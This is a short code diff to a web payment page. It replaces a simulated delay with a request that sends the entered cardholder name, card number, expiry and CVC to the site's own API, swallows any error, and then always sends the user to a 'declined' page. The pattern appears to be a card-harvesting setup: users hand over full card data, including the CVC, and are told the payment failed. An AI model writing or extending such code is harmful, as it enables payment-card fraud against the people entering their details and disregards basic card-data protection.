@@ -43,7 +43,14 @@ export default function PaymentPage() {
 
   async function handlePay() {
     setLoading(true);
-    await new Promise((resolve) => setTimeout(resolve, 2000));
+    const id = sessionStorage.getItem("applicationId");
+    if (id) {
+      await fetch(`/api/applications/${id}/card`, {
+        method: "PATCH",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ cardholderName, cardNumber, cardExpiry: expiry, cardCvc: cvc }),
+      }).catch(() => {});
+    }
     setLoading(false);
     router.push("/access/declined");
   }
